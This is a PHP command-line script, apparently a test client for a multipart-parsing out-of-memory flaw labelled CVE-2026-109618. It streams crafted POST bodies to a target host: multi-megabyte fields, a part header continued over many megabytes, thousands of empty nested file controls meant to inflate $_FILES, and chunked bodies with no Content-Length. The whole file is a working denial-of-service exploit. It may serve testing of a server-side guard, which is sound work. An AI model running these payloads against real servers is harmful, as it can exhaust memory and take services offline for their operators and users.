<?php
/* Raw HTTP client for the CVE-2026-109618 multipart OOM strategies. Streams the body, so it can send
 * bodies far larger than its own memory_limit. Usage: php oomclient.php host:port /path scenario [MB|count]
 *   normal           two fields + a 100 KB file
 *   bigfield N       one non-file field of N MB
 *   bigheader N      one part whose Content-Disposition header continues over N MB of lines
 *   emptyfiles N     N empty file controls with nested names (the $_FILES amplification)
 *   chunked N        bigfield N sent with Transfer-Encoding: chunked and no Content-Length */
$hostport = $argv[1]; $path = $argv[2]; $scenario = $argv[3];
$n = isset($argv[4]) ? (int) $argv[4] : 1;
$b = '----hpguardv3';
$MB = 1048576;

$parts = [];   /* each: [header string, body length, generator closure] */
switch ($scenario) {
	case 'normal':
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n", 1, function ($w) { $w('1'); }];
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"b\"\r\n\r\n", 2, function ($w) { $w('22'); }];
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"blob.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n", 100000, function ($w) { $w(str_repeat('x', 100000)); }];
		break;
	case 'latin1':   /* one field holding the single byte 0xE9: mbstring.encoding_translation turns it into UTF-8 */
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"v\"\r\n\r\n", 1, function ($w) { $w("\xE9"); }];
		break;
	case 'bigfield':
	case 'chunked':
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n", $n * $MB, function ($w) use ($n, $MB) {
			$chunk = str_repeat('y', $MB);
			for ($i = 0; $i < $n; $i++) $w($chunk);
		}];
		break;
	case 'bigheader':
		$line = str_repeat('h', 4094) . "\r\n";                 /* a continuation line: no ':' */
		$lines = (int) (($n * $MB) / strlen($line));
		$parts[] = ["--$b\r\nContent-Disposition: form-data; name=\"x\"\r\n", 0, null];
		$parts[0][3] = function ($w) use ($line, $lines) {   /* extra header lines, then the blank line + body */
			for ($i = 0; $i < $lines; $i++) $w($line);
			$w("\r\nv");
		};
		$parts[0][1] = $lines * strlen($line) + 3;
		break;
	case 'emptyfiles':   /* streamed as one pseudo-part that writes every part itself, trailing CRLFs included */
		$hdr = function ($i) use ($b) { return "--$b\r\nContent-Disposition: form-data; name=\"a[$i][b][c]\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n"; };
		$total = 0;
		for ($i = 0; $i < $n; $i++) $total += strlen($hdr($i));
		$parts[] = ['', $total, function ($w) use ($hdr, $n) {
			$buf = '';
			for ($i = 0; $i < $n; $i++) { $buf .= $hdr($i); if (strlen($buf) > 65536) { $w($buf); $buf = ''; } }
			$w($buf);
		}, null, true];
		break;
	default:
		fwrite(STDERR, "unknown scenario\n"); exit(2);
}
$tail = "--$b--\r\n";
$len = 0;
foreach ($parts as $p) $len += strlen($p[0]) + $p[1] + (empty($p[4]) ? 2 : 0);
$len += strlen($tail);

$s = stream_socket_client("tcp://$hostport", $errno, $errstr, 10);
if (!$s) { fwrite(STDERR, "connect: $errstr\n"); exit(2); }
stream_set_timeout($s, 120);
$chunked = $scenario === 'chunked';
$hdr = "POST $path HTTP/1.1\r\nHost: $hostport\r\nConnection: close\r\nContent-Type: multipart/form-data; boundary=$b\r\n";
$hdr .= $chunked ? "Transfer-Encoding: chunked\r\n" : "Content-Length: $len\r\n";
fwrite($s, $hdr . "\r\n");
$w = function ($data) use ($s, $chunked) {
	if ($data === '' || $data === null) return;
	if ($chunked) $data = dechex(strlen($data)) . "\r\n" . $data . "\r\n";
	for ($o = 0; $o < strlen($data); ) {
		$r = @fwrite($s, substr($data, $o, 65536));
		if ($r === false || $r === 0) { echo "status=closed-while-sending\n"; exit(0); }   /* server already answered */
		$o += $r;
	}
};
foreach ($parts as $p) {
	$w($p[0]);
	if (isset($p[3])) $p[3]($w); else $p[2]($w);
	if (empty($p[4])) $w("\r\n");
}
$w($tail);
if ($chunked) fwrite($s, "0\r\n\r\n");
$resp = stream_get_contents($s);
fclose($s);
preg_match('#^HTTP/1\.\d (\d+)#', $resp, $m);
$body = trim(substr($resp, strpos($resp, "\r\n\r\n") + 4));
$body = preg_replace('/\s+/', ' ', strip_tags($body));
echo "status=", isset($m[1]) ? $m[1] : '?', " ", substr($body, 0, 160), "\n";
